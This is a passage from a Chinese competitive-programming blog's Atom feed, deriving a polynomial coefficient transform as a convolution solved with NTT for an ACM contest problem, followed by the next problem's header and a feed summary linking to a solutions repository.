(j-i)!}(-S)^{j-i}<br>\end{split}\end{equation}$$<br>$\large \therefore b_i=\cfrac{1}{i!}\sum_{j=i}^{n}j!c_j\cdot \cfrac{(-S)^{j-i}}{(j-i)!}$<br>记$\large A_i=i!c_i，B_i=i!b_i，d_i=A_{n-i}，e_i=\cfrac{(-S)^{i}}{i!}，(1\le i\le n)$<br>$\large B_i=\sum_{k=i}^{n}A_k\cdot e_{k-i}=\sum_{k=0}^{n-i}d_{n-i-k}e_{k}$</p><p>考虑多项式乘法：<br>$A(x) = \sum_{i=0}^{n}a_ix^{i}$<br>$B(x) = \sum_{i=0}^{n}b_ix^{i}$<br>$C(x) = A(x)B(x) = \sum_{i=0}^{2n}c_ix^{i}$<br>$c_j = \sum_{i=0}^{j}a_ib_{j-i}$，</p><p>所以$B_i$即为多项式$D(x)E(x)$第$n-i$项的系数。</p><p>由于题目是在模意义下的，所以要用NTT，且费马质数必须为所给的模数。</p><h3 id="1011-RXD’s-date"><a href="#1011-RXD’s-date" class="headerlink" title="1011. RXD’s date"></a>1011. RXD’s date</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips&quot;&gt;&lt;/a&gt;Tips&lt;/h3&gt;&lt;p&gt;仅含题解，代码详见&lt;a href=&quot;https://github.com/Smlight/ACMer/tree/master
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
</feed>
